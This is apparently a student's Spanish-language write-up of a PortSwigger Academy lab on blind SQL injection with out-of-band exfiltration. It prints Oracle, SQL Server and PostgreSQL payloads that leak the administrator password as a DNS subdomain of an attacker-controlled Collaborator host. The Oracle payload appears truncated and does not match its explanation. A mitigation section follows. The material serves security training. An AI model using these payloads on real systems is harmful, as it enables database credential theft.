Lab17: Blind SQL injection with out-of-band data exfiltration

Nivel Practitioner
Tipo de SQLi Blind SQL injection (Out-of-band Data Exfiltration)

Objetivo

Extraer la contraseña del usuario administrator utilizando interacciones DNS externas, exfiltrando los datos mediante consultas fuera de banda (out-of-band).

Vulnerabilidad

La cookie TrackingId es vulnerable a inyección SQL. Similar al Laboratorio 16, pero ahora se concatenan resultados de consultas (como la contraseña) dentro del subdominio solicitado al atacante, permitiendo la exfiltración de datos.

Los ataques out-of-band (OOB) con exfiltración de datos son una técnica avanzada que se utiliza cuando no hay respuesta directa ni se pueden realizar inferencias por tiempo de manera fiable. El ataque obliga a la base de datos a realizar una solicitud externa (normalmente DNS) a un servidor controlado por el atacante, incluyendo los datos robados como parte del subdominio o de la petición.

En este laboratorio, se debe extraer la contraseña completa del usuario administrator y enviarla mediante una consulta DNS al servidor del atacante (Burp Collaborator).

Nota importante: Este laboratorio requiere la versión Professional de Burp Suite, ya que utiliza la funcionalidad Burp Collaborator para recibir las interacciones externas y capturar los datos exfiltrados. Con la versión Community no es posible completarlo, pero se puede comprender el procedimiento teórico.

Procedimiento (Teórico)

Nota: Al requerir la versión Professional de Burp Suite (elemento con el cual no se cuenta en este entorno educativo), no se pueden adjuntar las evidencias prácticas (capturas). A continuación se explica el procedimiento teórico que se seguiría con Burp Collaborator para exfiltrar datos.

  1. Interceptar la petición con Burp Proxy que contenga la cookie TrackingId. 
    GET / HTTP/1.1
Cookie: TrackingId=xyz123
  2. Abrir Burp Collaborator desde el menú de Burp Suite Professional. Esto genera un subdominio único, por ejemplo: abcdef12345678.oastify.com.
  3. Construir un payload que concatene el resultado de la consulta a la tabla users con el dominio de Collaborator. Dependiendo del motor de base de datos, el payload varía. Para Oracle, se utiliza una técnica similar al Lab 16 pero incluyendo la subconsulta que extrae la contraseña.

    Payload para Oracle (con exfiltración de datos):

    TrackingId=xyz' UNION SELECT extractvalue(xmltype(' %remote;]>'),'/l') FROM dual--

    Payload para Microsoft SQL Server:

    TrackingId=xyz'; declare @p varchar(8000)=(SELECT password FROM users WHERE username='administrator'); exec('master..xp_dirtree "\\' + @p + '.abcdef12345678.oastify.com\file"')--

    Payload para PostgreSQL (con dblink):

    TrackingId=xyz'; CREATE EXTENSION IF NOT EXISTS dblink; SELECT dblink_connect('host='||(SELECT password FROM users WHERE username='administrator')||'.abcdef12345678.oastify.com');--
  4. Inyectar el payload en la cookie TrackingId y enviar la petición.
  5. Verificar en Burp Collaborator la recepción de interacciones. En los logs de DNS aparecerán consultas cuyo subdominio incluye la contraseña del administrador.
  6. Extraer la contraseña de los registros de Collaborator. Por ejemplo, una consulta DNS a 8fg5h2j1k4m9p3q7r2s5.abcdef12345678.oastify.com revelaría que la contraseña es "8fg5h2j1k4m9p3q7r2s5".
  7. Iniciar sesión con las credenciales obtenidas del usuario administrator.

Payload de ejemplo (Oracle con exfiltración)

TrackingId=xyz' UNION SELECT extractvalue(xmltype(' %remote;]>'),'/l') FROM dual--

Explicación del payload (Oracle)

  • xyz': Cierra la cadena original de la cookie TrackingId.
  • UNION SELECT: Combina la consulta original con una consulta maliciosa.
  • extractvalue(): Función de Oracle que procesa XML. Se utiliza para forzar una solicitud externa.
  • xmltype(): Convierte una cadena en tipo XML.
  • 'http://'||(SELECT password FROM users WHERE username='administrator')||'.abcdef12345678.oastify.com/': Construye una URL que incluye la contraseña del administrador como subdominio. El operador || concatena la cadena con el resultado de la subconsulta.
  • %remote;]>: Definición de entidad externa XML que fuerza una petición HTTP al servidor del atacante, con la contraseña incluida en el subdominio.
  • FROM dual: Tabla dummy de Oracle necesaria para completar la consulta.
  • --: Comenta el resto de la consulta original.

Funcionamiento de la exfiltración

Cuando la base de datos procesa la función extractvalue(), intenta resolver la entidad externa definida en el XML. La URL incluye el resultado de la subconsulta (la contraseña) como parte del subdominio. Esto genera una petición DNS/HTTP a un dominio como:

8fg5h2j1k4m9p3q7r2s5.abcdef12345678.oastify.com

El servidor del atacante (Burp Collaborator) recibe esta petición y registra el subdominio completo, revelando así la contraseña.

Verificación del ataque

La vulnerabilidad se confirmaría al observar en Burp Collaborator las siguientes interacciones:

  • Consultas DNS desde la IP del servidor de la base de datos.
  • El subdominio de la consulta contiene la contraseña del administrador (por ejemplo, "8fg5h2j1k4m9p3q7r2s5.abcdef12345678.oastify.com").
  • Registros de conexiones en el cliente de Collaborator con la contraseña visible.

Esto demostraría que:

  • Es posible ejecutar comandos SQL arbitrarios.
  • La base de datos tiene conectividad a Internet o a la red interna.
  • Se pueden exfiltrar datos completos mediante canales fuera de banda.
  • La técnica es efectiva incluso cuando no hay respuesta directa ni inferencia posible.

Una vez obtenida la contraseña de los logs de Collaborator, se introduce en el formulario de login junto con el usuario "administrator" y se accede al panel de administración, resolviendo el laboratorio.

Resultado esperado: El laboratorio se resuelve correctamente al exfiltrar la contraseña mediante out-of-band e iniciar sesión como administrator, apareciendo el mensaje "Congratulations, you solved the lab!" en la interfaz de PortSwigger Academy.

Mitigación recomendada

Consultas Preparadas (Parameterized Queries)

Implementar consultas parametrizadas es la defensa principal. Al usar parámetros, los valores inyectados se tratan como datos y no como parte del código SQL, bloqueando cualquier intento de inyección.

SELECT * FROM tracking WHERE id = ?

Firewall de Base de Datos y Restricción de Tráfico Saliente

Implementar firewalls de base de datos que bloqueen tráfico saliente no autorizado, especialmente hacia Internet. La base de datos no debería tener acceso a Internet a menos que sea estrictamente necesario. Configurar reglas de firewall que solo permitan tráfico saliente a direcciones específicas y autorizadas.

Deshabilitar Funciones Peligrosas

Deshabilitar o restringir funciones que permiten interacciones externas:

  • Oracle: Restringir el uso de UTL_HTTP, UTL_TCP, y funciones XML que permitan entidades externas. Revocar permisos sobre estas funciones.
  • Microsoft SQL Server: Deshabilitar xp_cmdshell, xp_dirtree y otras funciones extendidas mediante configuración de surface area.
  • PostgreSQL: No instalar extensiones como dblink si no son necesarias. Revocar permisos de ejecución.
  • MySQL: Deshabilitar LOAD_FILE, restringir INTO OUTFILE y asegurar que secure_file_priv esté configurado adecuadamente.

Principio de Menor Privilegio

La cuenta de base de datos utilizada por la aplicación debe tener permisos mínimos. No debería tener acceso a funciones que permiten interacciones de red ni a tablas del sistema que contengan información sensible.

Segmentación de Red y Zero Trust

Segmentar la red para que los servidores de base de datos no tengan acceso directo a Internet. Implementar arquitectura Zero Trust donde las bases de datos solo puedan comunicarse con aplicaciones específicas dentro de la red interna.

Validación de Entradas

Validar estrictamente el formato del TrackingId. Si sigue un patrón predecible (alfanumérico de longitud fija), rechazar cualquier valor que no cumpla con ese patrón.

Web Application Firewall (WAF)

Implementar un WAF que detecte y bloquee patrones de inyección SQL, incluyendo intentos de usar funciones de red, entidades externas XML y concatenaciones que parezcan construir dominios.

Monitoreo y Detección

Implementar sistemas de detección que alerten sobre tráfico DNS o HTTP inusual desde servidores de base de datos, lo que podría indicar un intento de exfiltración out-of-band.
